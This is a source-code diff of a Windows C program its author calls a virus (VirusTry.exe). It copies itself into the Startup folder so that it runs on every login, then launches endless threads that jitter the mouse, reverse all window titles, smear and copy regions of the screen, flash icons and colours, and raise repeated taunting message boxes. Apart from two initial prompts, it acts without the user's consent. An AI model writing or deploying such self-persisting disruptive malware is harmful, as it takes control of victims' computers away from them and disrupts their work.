@@ -12,36 +12,78 @@
 #include <stdlib.h>
 #pragma comment(lib, "winmm.lib")
 
+
 HINSTANCE g_hThisInstance;
 
 // Stores the current location of the running app
-char g_szAppPath[100];
+WCHAR g_szAppPath[100];
 
 // Stores the startup path of windows
-char g_szStartupPath[100];
+WCHAR g_szStartupPath[100];
 
-char* DUMMY_SYS_FILES_PATH = "C:\\Windows System Files";
-
+// Setting
 void Init();
 BOOL CopySelf();
 BOOL IsInStartupPath();
 
+// Startup
 void StartVirus();
-void ExecuteFromStartup();
+void ExecuteFromStartup(LPCWSTR arg);
+
+// Threads
+void* Thread_title_change(void* args);
+void* Thread_copy_alldesktop(void* args);
+void* Thread_copy_somepart(void* args);
 
 int WINAPI WinMain (HINSTANCE hThisInstance,
                      HINSTANCE hPrevInstance,
                      LPSTR lpszArgument,
                      int nCmdShow)
 {
+    LPWSTR* args = NULL;
+    int argc = 0;
     Init();
+    BOOL copyf = CopySelf();
 
-    if (IsInStartupPath()) {
+    args = CommandLineToArgvW(GetCommandLineW(), &argc);
+
+    if ((argc > 1) && (IsInStartupPath() == TRUE))
+    {
+        if (lstrcmpW(args[1], L"/main") != 0)
+        {
+            ExecuteFromStartup(NULL);
+            return 0;
+        }
+        LocalFree(args);
         StartVirus();
-    } else {
-        CopySelf();
-        ExecuteFromStartup();
+    } else if (copyf == TRUE) {
+        LocalFree(args);
+        pthread_t pht[3];
+        PlaySoundA("SystemExclamation", NULL, SND_ASYNC);
+        if (MessageBoxA(NULL, "Hi! \nThis is a SoftWare Execute. ", "Startup", MB_OKCANCEL) == IDCANCEL) {
+            return 0;
+        }
+        PlaySoundA("SystemExclamation", NULL, SND_ASYNC);
+        if (MessageBoxA(NULL, "We are now prepare to show you some icons on your desktop. \nAre you okay? ", "Get Ready", MB_OKCANCEL) == IDCANCEL) {
+            return 0;
+        }
+
+        Sleep(20000);
+        for (int i = 0; i < 5; i++)
+        {
+            if (i == 2) {
+                pthread_create(&pht[0], NULL, Thread_title_change, NULL);
+                pthread_create(&pht[1], NULL, Thread_copy_somepart, NULL);
+            }
+            ExecuteFromStartup(L"/main");
+            Sleep(20000);
+        }
+        pthread_create(&pht[2], NULL, Thread_copy_alldesktop, NULL);
+        pthread_exit(NULL);
+        exit(0);
     }
+
+    return -1;
 }
 
 void* Thread_play(void* args)
@@ -98,7 +140,6 @@ void* Thread_show(void* args)
             icon = IDI_WINLOGO;
             break;
         }
-        //PlaySoundA(sound, NULL, SND_SYNC);
         DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, icon));
         Sleep(10);
     }
@@ -120,44 +161,145 @@ void* Thread_color(void* args)
     }
 }
 
-void showicons()
+void* _Thread_msg(void* args)
+{
+    MessageBoxW(NULL, L"Did you enjoy it??? ", L"lol", MB_YESNO);
+}
+
+void* Thread_msg(void* args)
 {
     pthread_t pht;
+    while (1)
+    {
+        Sleep(20000);
+        pthread_create(&pht, NULL, _Thread_msg, NULL);
+    }
+}
 
-    pthread_create(&pht, NULL, Thread_play, NULL);
-    pthread_create(&pht, NULL, Thread_show, NULL);
-    pthread_create(&pht, NULL, Thread_color, NULL);
+void* Thread_mouse_change(void* args)
+{
+    POINT point;
+    int v1, v2, v3;
+    while (1)
+    {
+        GetCursorPos(&point);
+        v1 = rand() % 2;
+        v2 = rand() % 2;
+        v3 = rand() % 2;
+        if (v3 == 1) {
+            SetCursorPos(point.x+v1, point.y+v2);
+        } else if (v3 == 0) {
+            SetCursorPos(point.x-v1, point.y-v2);
+        }
+        Sleep(10);
+    }
+}
 
-    pthread_exit(NULL);
+void reverse_string(char* arr)
+{
+    int len = strlen(arr);
+    char tmp = *arr;
+    *arr = *(arr + len - 1);
+    *(arr + len - 1) = '\0';
+    if (strlen(arr + 1) >= 2)
+        reverse_string(arr + 1);
+
+    *(arr + len - 1) = tmp;
+}
+
+BOOL CALLBACK EnumFunc(HWND hWnd, LPARAM lParam)
+{
+    char wszTitle[MAX_PATH] = {0};
+    GetWindowTextA(hWnd, wszTitle, MAX_PATH);
+    reverse_string(wszTitle);
+    SetWindowTextA(hWnd, wszTitle);
+    return TRUE;
+}
+
+void* Thread_title_change(void* args)
+{
+    HWND Desktop = GetDesktopWindow();
+    while (1) {
+        EnumChildWindows(Desktop, EnumFunc, 0);
+        Sleep(2000);
+    }
+}
+
+void* Thread_copy_alldesktop(void* args)
+{
+    while (1)
+    {
+        HWND hWnd = GetDesktopWindow();
+        HDC hdc = GetWindowDC(hWnd);
+        struct tagRECT Rect;
+
+        GetWindowRect(hWnd, &Rect);
+        StretchBlt(hdc, 50, 50, Rect.right - 100, Rect.bottom - 100, hdc, 0, 0, Rect.right, Rect.bottom, SRCCOPY);
+        ReleaseDC(hWnd, hdc);
+        Sleep(2000);
+    }
+}
+
+void* Thread_copy_somepart(void* args)
+{
+    int x, y;
+    int v2, v3, v4, v5, v6, v7, v8, v9;
+    HDC v10;
+    while (1)
+    {
+        HWND hWnd = GetDesktopWindow();
+        HDC hdc = GetWindowDC(hWnd);
+        struct tagRECT Rect;
+        GetWindowRect(hWnd, &Rect);
+        v2 = rand()%100;
+        x = v2 % (Rect.right - 100);
+        v3 = rand()%(Rect.right - 100);
+        y = v3 % (Rect.bottom - 100);
+        v4 = rand()%(Rect.bottom - 100);
+        v5 = v4 % (Rect.right - 100);
+        v6 = rand()%(Rect.right - 100);
+        v7 = v6 % (Rect.bottom - 100);
+        v8 = rand()%(Rect.bottom - 100) % 600;
+        v9 = rand()%600;
+        v10 = hdc;
+
+        BitBlt(hdc, x, y, v8, v9 % 600, hdc, v5, v7, SRCCOPY);
+        ReleaseDC(hWnd, v10);
+        Sleep(2000);
+    }
 }
 
 void StartVirus()
 {
-    if (MessageBoxA(NULL, "Hi! \nThis is a SoftWare Execute. ", "Startup", MB_OKCANCEL) == IDCANCEL) {
-        return;
-    }
-    if (MessageBoxA(NULL, "We are now prepare to show you some icons on your desktop. \nAre you okay? ", "Get Ready", MB_OKCANCEL) == IDCANCEL) {
-        return;
-    }
-    showicons();
+    pthread_t pht[6];
+
+    pthread_create(&pht[0], NULL, Thread_mouse_change, NULL);
+    Sleep(15000);
+    pthread_create(&pht[1], NULL, Thread_play, NULL);
+    pthread_create(&pht[2], NULL, Thread_show, NULL);
+    Sleep(20000);
+    pthread_create(&pht[3], NULL, Thread_color, NULL);
+    pthread_create(&pht[4], NULL, Thread_msg, NULL);
+
+    pthread_exit(NULL);
 }
 
-void ExecuteFromStartup()
+void ExecuteFromStartup(LPCWSTR arg)
 {
-    char szStartup[100];
-    strcpy(szStartup, g_szStartupPath);
-    strcat(szStartup, "\\VirusTry.exe");
+    WCHAR szStartup[100];
+    lstrcpyW(szStartup, g_szStartupPath);
+    lstrcatW(szStartup, L"\\VirusTry.exe");
 
-    ShellExecute(NULL, "open", szStartup, NULL, NULL, SW_SHOW);
+    ShellExecuteW(NULL, NULL, szStartup, arg, NULL, SW_SHOW);
 }
 
 BOOL IsInStartupPath()
 {
-    char szStartup[100];
-    strcpy(szStartup, g_szStartupPath);
-    strcat(szStartup, "\\VirusTry.exe");
+    WCHAR szStartup[100];
+    lstrcpyW(szStartup, g_szStartupPath);
+    lstrcatW(szStartup, L"\\VirusTry.exe");
 
-    if (strcmp(szStartup, g_szAppPath) == 0) {
+    if (lstrcmpW(szStartup, g_szAppPath) == 0) {
         return TRUE;
     }
 
@@ -166,11 +308,11 @@ BOOL IsInStartupPath()
 
 BOOL CopySelf()
 {
-    char szDest[100];
-    strcpy(szDest, (const char*)g_szStartupPath);
-    strcat(szDest, "\\VirusTry.exe");
+    WCHAR szDest[100];
+    lstrcpyW(szDest, g_szStartupPath);
+    lstrcatW(szDest, L"\\VirusTry.exe");
 
-    if (CopyFile(g_szAppPath, szDest, FALSE))
+    if (CopyFileW(g_szAppPath, szDest, FALSE))
     {
         return TRUE;
     }
@@ -179,7 +321,7 @@ BOOL CopySelf()
 
 void Init()
 {
-    GetModuleFileName(g_hThisInstance, g_szAppPath, 100);
-    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, NULL, g_szStartupPath);
+    GetModuleFileNameW(g_hThisInstance, g_szAppPath, 100);
+    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, NULL, g_szStartupPath);
 }
 
